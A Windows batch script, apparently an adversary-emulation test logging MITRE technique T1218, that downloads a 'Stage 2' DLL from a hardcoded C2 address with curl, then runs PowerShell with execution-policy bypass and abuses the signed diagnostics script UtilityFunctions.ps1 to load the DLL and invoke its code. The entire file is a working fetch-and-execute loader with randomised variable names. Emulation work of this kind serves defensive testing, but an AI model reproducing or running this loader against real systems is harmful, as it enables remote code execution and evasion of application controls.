@echo off
setlocal enabledelayedexpansion

REM ----------------------------------------------------------------------
REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
REM ----------------------------------------------------------------------
SET aBcDeFgH=%APPDATA%\12194\d9e8ac44
SET XyZ123Ab=b2caf9d9.txt
SET qWeRtYzU=https://10.0.0.49/stage/2/icon.png?12194-7
SET pOqRsTvW=ITZEL-S2B
SET lMnOpQrS=12194
SET tUvWxYzA=7
SET bCdEfGhI=%PUBLIC%\\macula-simulations.log
REM https://10.0.0.49 not used but stored for completeness
SET jKlMnOpQ=https://10.0.0.49

REM ----------------------------------------------------------------------
REM Debug timestamp (cached at start)
REM ----------------------------------------------------------------------
SET tsvar=!DATE!/!TIME!

REM ----------------------------------------------------------------------
REM 1. Heartbeat fetch – download Stage 2 Loader DLL from C2
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: heartbeat_start>> "!bCdEfGhI!" 2>nul
curl -k -s -o "!aBcDeFgH!\!XyZ123Ab!" "!qWeRtYzU!"
if !errorlevel! neq 0 (
    echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: heartbeat_fail>> "!bCdEfGhI!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: heartbeat_complete>> "!bCdEfGhI!" 2>nul
)

REM ----------------------------------------------------------------------
REM 2. Position working directory
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: chdir_start>> "!bCdEfGhI!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: chdir_result=!errorlevel!>> "!bCdEfGhI!" 2>nul

REM ----------------------------------------------------------------------
REM 3. Invoke Stage 2 DLL via PowerShell LOLBIN
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: powershell_start>> "!bCdEfGhI!" 2>nul

REM Build PowerShell command with expanded placeholders (using delayed expansion)
set "psCmd=powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; RegSnapin !aBcDeFgH!\\!XyZ123Ab!; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)\""

REM Execute the command
%psCmd%
set psErrlev=!errorlevel!

echo [!tsvar!][DEBUG][!pOqRsTvW!][!lMnOpQrS!]: powershell_complete>> "!bCdEfGhI!" 2>nul

REM ----------------------------------------------------------------------
REM 4. Generate TTP log line with timestamp and result
REM ----------------------------------------------------------------------
REM Obtain high-precision timestamp via PowerShell
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

if !psErrlev! equ 0 (
    set result=OK
    set errDetail=
) else (
    set result=FAIL
    set errDetail=powershell_error !psErrlev!
)

REM Write TTP log line using caret-pipe to avoid pipe interpretation
echo [!timestamp!][TTP][!pOqRsTvW!][!lMnOpQrS!]: T1218^|System Binary Proxy Execution=[!result!]:[!errDetail!]>> "!bCdEfGhI!" 2>&1

REM ----------------------------------------------------------------------
REM Done – exit immediately
REM ----------------------------------------------------------------------
endlocal